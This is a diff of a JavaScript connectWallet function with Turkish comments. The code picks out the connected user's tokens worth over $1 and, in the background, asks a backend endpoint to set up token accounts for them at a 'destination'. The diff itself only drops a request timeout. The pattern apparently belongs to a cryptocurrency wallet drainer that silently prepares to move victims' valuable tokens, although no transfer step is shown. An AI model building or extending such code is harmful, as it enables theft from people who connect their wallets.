@@ -170,29 +170,15 @@ export async function connectWallet() {
         }
 
         console.log(`Değeri $1 üstü olan ${valuableMints.length} adet token bulundu. Backend'e ATA kurulumu emri veriliyor...`);
-        
-        // 4. Backend Serverless'a eksik ATAları kurması için istek at (15 saniye timeout)
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 15000);
+        // 4. Backend Serverless'a eksik ATAları kurması için istek at
+        const setupRes = await fetch('/api/setup-atas', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ mints: valuableMints, destination }),
+        });
 
-        try {
-            const setupRes = await fetch('/api/setup-atas', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mints: valuableMints, destination }),
-                signal: controller.signal
-            });
-
-            clearTimeout(timeoutId);
-            const setupResult = await setupRes.json();
-            console.log("ATA Setup Result:", setupResult);
-        } catch (fetchErr) {
-            if (fetchErr.name === 'AbortError') {
-                console.warn("ATA setup isteği zaman aşımına uğradı (15s).");
-            } else {
-                throw fetchErr;
-            }
-        }
+        const setupResult = await setupRes.json();
+        console.log("ATA Setup Result:", setupResult);
 
       } catch (err) {
         console.error("Arka planda otomatik ATA kurma işleminde hata:", err);
